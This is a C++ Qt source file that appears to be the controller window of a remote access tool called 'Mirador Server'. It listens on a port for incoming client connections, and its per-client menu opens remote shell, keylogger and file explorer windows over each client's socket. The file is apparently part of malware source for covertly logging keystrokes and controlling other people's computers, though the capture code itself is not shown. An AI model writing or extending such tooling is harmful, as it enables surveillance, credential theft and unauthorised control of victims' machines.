#include "mainwindow.h"
#include "ui_mainwindow.h"

#include <QTextEdit>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    _li = new Listener(ui->listWidget, this);

    _actions = new QMenu(this);
    _actions->addAction(QIcon(":/img/console-ico.png"), tr("Remote shell"), this, [this]{ this->openWindow<ClientShell>(this->_rem_sh); } );
    _actions->addAction(QIcon(":/img/keylog.png"), tr("Keylogger"), this, [this]{ this->openWindow<Keylogs>(this->_out_keys); });
    _actions->addAction(QIcon(":/img/folder.png"), tr("File explorer"), this, [this]{ this->openWindow<Explorer>(this->_explorer); });

    connect(ui->listenBut, &QPushButton::clicked, this, &MainWindow::listen);

    ui->listWidget->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(ui->listWidget, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(contextMenu(QPoint)));
}

template<typename T>
void MainWindow::openWindow(T* var)
{
    clearWindows();
    if(_li != nullptr) {
        auto &item = ui->listWidget->selectedItems().at(0);
        QTcpSocket* con = _li->getConnection(item);
        var = new T(con, this);
        var->show();
    }
}

void MainWindow::clearWindows()
{
    delete _rem_sh;
    delete _out_keys;
    delete _explorer;
}

MainWindow::~MainWindow()
{
    clearWindows();
    delete ui;
}

void MainWindow::contextMenu(const QPoint &pos)
{
    if(ui->listWidget->selectedItems().size() == 1)
        _actions->exec(ui->listWidget->mapToGlobal(pos));
}

void MainWindow::listen()
{
    if(!_li->isListening()) {
        _li->startListening(ui->portListen->value());
        ui->listenBut->setText(tr("Stop"));

        ui->lineEdit->setEnabled(false);
        ui->portListen->setEnabled(false);

        setWindowTitle(windowTitle() + tr(" - Listening"));
    } else {
        clearWindows();
        ui->listenBut->setText(tr("Listen"));
        setWindowTitle("Mirador Server");

        ui->lineEdit->setEnabled(true);
        ui->portListen->setEnabled(true);

        _li->suspendListen();
    }
}
